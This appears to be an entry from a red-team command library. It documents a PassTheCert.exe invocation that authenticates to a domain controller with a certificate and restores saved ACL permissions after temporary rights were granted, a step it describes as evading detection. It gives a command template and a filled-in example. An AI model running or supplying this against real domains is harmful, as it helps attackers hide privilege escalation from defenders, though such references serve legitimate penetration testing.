---
id: 29361b2d-9662-4380-8954-ebcb445a7fa0
name: passthecert-restore-permissions
type: command
executor: cmd
data: >-
  PassTheCert.exe --server $_DC_HOST --cert-path $_CERT_PFX --elevate --target
  $_DOMAIN_DN --restore $_RESTORATION_FILE
output: null
created_at: '2023-04-06T03:56:06.176594+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - adcs
  - restore
  - cleanup
verified: true
validated: true
---

# passthecert-restore-permissions

## Command

```cmd
PassTheCert.exe --server $_DC_HOST --cert-path $_CERT_PFX --elevate --target $_DOMAIN_DN --restore $_RESTORATION_FILE
```

## Description

Restores original ACL permissions on the domain after granting temporary rights, using a saved restoration file to evade detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --server | DC hostname | Yes |
| --cert-path | PFX path | Yes |
| --elevate | Elevation flag | Yes |
| --target | Domain DN | Yes |
| --restore | Path to restoration file | Yes |

## Examples

### Basic Usage

```cmd
PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration.txt
```

## Expected Output

Permissions restored successfully.
No lingering ACL changes.

## Related

- [[procedures/Pass-The-Certificate-Attack]]
